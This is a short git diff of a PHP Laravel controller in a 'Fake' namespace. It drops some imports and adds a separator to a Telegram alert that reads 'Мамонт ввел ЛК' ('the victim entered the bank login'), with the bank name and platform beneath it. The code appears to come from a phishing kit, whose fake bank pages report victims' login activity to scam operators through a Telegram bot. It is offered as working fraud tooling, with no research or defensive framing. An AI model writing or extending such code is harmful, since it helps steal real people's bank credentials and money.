@@ -2,24 +2,17 @@
 
 namespace App\Http\Controllers\Fake;
 
-use App\Broadcasting\RedirectionChannel;
-use App\Events\RedirectEvent;
 use App\Http\Controllers\Telegram\BotController;
 use App\Models\Fake;
 use App\Http\Controllers\Controller;
-use App\Models\TelegramUser;
-use App\Models\User;
 use Exception;
 use Illuminate\Http\Request;
-use Illuminate\Support\Facades\Auth;
 use Illuminate\Support\Str;
-use Telegram\Bot\Api;
 use Telegram\Bot\Exceptions\TelegramSDKException;
 use Telegram\Bot\Keyboard\Keyboard;
 use Telegram\Bot\Objects\Message;
 use Throwable;
 use Cache;
-use Illuminate\Support\Facades\View;
 
 class PagesController extends Controller
 {
@@ -213,6 +206,7 @@ class PagesController extends Controller
         $html = $step && view()->exists($step) ? view($step)->render() : null;
         $text = [
             "⭐️<b>Мамонт ввел ЛК</b>",
+            "=================",
             "🏛<b>$bankName</b>",
             "=================",
             "🚛<b>Платформа:</b> <code>{$this->platform()}</code>",
